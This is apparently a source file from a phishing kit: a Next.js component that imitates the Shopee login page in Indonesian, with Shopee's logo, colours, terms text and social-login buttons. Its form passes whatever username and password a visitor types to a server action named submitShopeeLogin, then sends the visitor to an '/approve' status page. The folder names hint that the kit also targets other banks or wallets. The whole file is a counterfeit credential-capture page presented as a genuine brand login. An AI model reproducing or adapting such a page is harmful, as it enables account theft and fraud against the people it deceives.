"use client";

import { useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { ArrowLeft, Eye, EyeOff, QrCode } from "lucide-react";
import { submitShopeeLogin } from "@/lib/action";
import Link from "next/link";

export default function ShopeeLogin() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    if (!username) {
      setError("No. Handphone/Username/Email is required.");
      setIsLoading(false);
      return;
    }

    if (!password) {
      setError("Password is required.");
      setIsLoading(false);
      return;
    }

    try {
      const response = await submitShopeeLogin(username, password);
      if (response.success) {
        router.push("/b/status/approve");
      } else {
        setError(response.error || "Login failed");
      }
    } catch (err) {
      setError("An unexpected error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const isFormValid = username.length >= 3 && password.length >= 6;

  return (
    <div className="min-h-[100dvh] bg-[#ee4d2d] flex flex-col font-sans relative">
      {/* Header */}
      <div className="p-4 text-white z-10 w-full">
        <button
          onClick={() => router.back()}
          type="button"
          className="p-1 -ml-1 rounded-full hover:bg-white/10 transition-colors inline-block"
          aria-label="Go back"
        >
          <ArrowLeft className="w-6 h-6" />
        </button>
        <div className="flex justify-center w-full mt-2 mb-2">
          <Image 
            src="/bank/Shopee_logo.svg" 
            alt="Shopee" 
            width={80}
            height={20}
            className="brightness-0 invert"
            priority
          />
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center px-4 pt-6 pb-8 z-10">
        <div className="w-full max-w-[400px] bg-white rounded shadow-sm overflow-hidden flex flex-col">
          
          <div className="px-6 py-8 flex flex-col gap-5">
            {/* Title & QR Log In */}
            <div className="flex items-center justify-between mb-2">
              <h2 className="text-[1.35rem] font-medium text-[#222]">Log In</h2>
              <div className="flex items-center">
                <div className="relative bg-[#fffee8] border border-[#ffc338] text-[#ee4d2d] text-xs font-semibold px-2 py-1 mr-2 flex items-center">
                  Log in dengan QR
                  {/* Tooltip triangle */}
                  <div className="absolute right-[-5px] top-1/2 -translate-y-1/2 w-0 h-0 border-t-[5px] border-t-transparent border-b-[5px] border-b-transparent border-l-[5px] border-l-[#ffc338]"></div>
                  <div className="absolute right-[-4px] top-1/2 -translate-y-1/2 w-0 h-0 border-t-[4px] border-t-transparent border-b-[4px] border-b-transparent border-l-[4px] border-l-[#fffee8]"></div>
                </div>
                <button type="button" className="text-[#ee4d2d]">
                  <QrCode className="w-8 h-8" strokeWidth={1.5} />
                </button>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="flex flex-col gap-4">
              {/* Username Input */}
              <div>
                <input 
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="No. Handphone/Username/Email"
                  className="w-full px-3 py-[10px] border text-black border-[#d9d9d9] rounded-sm text-sm focus:outline-none focus:border-black/50 transition-colors placeholder:text-gray-400"
                />
              </div>

              {/* Password Input */}
              <div className="relative">
                <input 
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full text-black pl-3 pr-10 py-[10px] border border-[#d9d9d9] rounded-sm text-sm focus:outline-none focus:border-black/50 transition-colors placeholder:text-gray-400"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
                >
                  {showPassword ? (
                    <Eye className="w-[18px] h-[18px]" strokeWidth={1.5} />
                  ) : (
                    <EyeOff className="w-[18px] h-[18px]" strokeWidth={1.5} />
                  )}
                </button>
              </div>

              {error && <p className="text-[#ee4d2d] text-xs -mt-1">{error}</p>}

              {/* Submit Button */}
              <button 
                type="submit" 
                disabled={!isFormValid || isLoading}
                className={`mt-1 w-full py-[10px] rounded-sm text-white font-medium text-sm transition-all
                  ${isFormValid && !isLoading 
                    ? "bg-[#ee4d2d] hover:bg-[#d74326] shadow-sm" 
                    : "bg-[#ee4d2d] opacity-70 cursor-not-allowed"}`}
              >
                {isLoading ? "Memproses..." : "LOG IN"}
              </button>
              
              <div className="flex justify-between items-center mt-[-4px]">
                <button type="button" className="text-[#05a] text-xs hover:text-[#05a]/80">
                  Lupa Password
                </button>
              </div>
            </form>

            {/* Divider */}
            <div className="flex items-center my-1">
              <div className="flex-1 h-[1px] bg-[#e0e0e0]"></div>
              <span className="px-4 text-[#ccc] text-xs">ATAU</span>
              <div className="flex-1 h-[1px] bg-[#e0e0e0]"></div>
            </div>

            {/* Social Buttons */}
            <div className="grid grid-cols-2 gap-3">
              <button type="button" className="flex items-center justify-center gap-2 py-[8px] border border-[#e0e0e0] rounded-sm hover:bg-gray-50 transition-colors">
                <svg className="w-[22px] h-[22px]" viewBox="0 0 24 24">
                  <path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                <span className="text-[#222] text-sm">Facebook</span>
              </button>
              <button type="button" className="flex items-center justify-center gap-2 py-[8px] border border-[#e0e0e0] rounded-sm hover:bg-gray-50 transition-colors">
                <svg className="w-[22px] h-[22px]" viewBox="0 0 24 24">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                <span className="text-[#222] text-sm">Google</span>
              </button>
            </div>
            
            {/* Terms and Conditions */}
            <div className="text-center mt-2 px-2">
              <p className="text-[#222] text-xs leading-relaxed">
                Dengan login, kamu menyetujui <span className="text-[#ee4d2d] cursor-pointer hover:underline">Syarat, Ketentuan dan Kebijakan dari Shopee</span> &amp; <span className="text-[#ee4d2d] cursor-pointer hover:underline">Kebijakan Privasi Shopee.</span>
              </p>
            </div>

          </div>
        </div>

        {/* Footer Link */}
        <div className="mt-6 text-center text-white text-[13px]">
          <span className="opacity-90">Baru di Shopee?</span>{" "}
          <button type="button" className="font-semibold hover:underline">
            Daftar
          </button>
        </div>
      </div>
    </div>
  );
}
